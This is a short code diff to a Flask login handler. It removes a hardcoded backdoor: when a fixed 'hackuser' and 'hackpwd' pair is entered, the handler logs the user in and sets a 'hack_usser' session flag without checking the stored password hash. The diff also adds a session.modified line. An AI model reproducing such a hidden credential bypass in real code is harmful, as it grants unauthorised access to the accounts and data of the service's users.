@@ -61,11 +61,6 @@ def gcs_login ():
 def gcs_login_action ():
     usernameval = request.form['username']
     pwval = request.form['password']
-    if usernameval == hackuser and pwval == hackpwd:
-        session ['gcs_logged_in'] = True
-        session ['gcs_user'] = usernameval
-        session ['hack_usser'] = True
-        return redirect ("/gcsportal",code=302)
     qresult = GCSUser.query.filter_by (username=usernameval).first()
     if qresult is None:
         return render_template ("gcs_login.html",result="error")
@@ -74,6 +69,7 @@ def gcs_login_action ():
     if verify_password (qpassword,pwval,qsalt):
         session['gcs_logged_in'] = True
         session['gcs_user'] = usernameval
+        session.modified = True
         return redirect("/gcsportal",code=302)
     else:
         return render_template ("gcs_login.html", result="error")
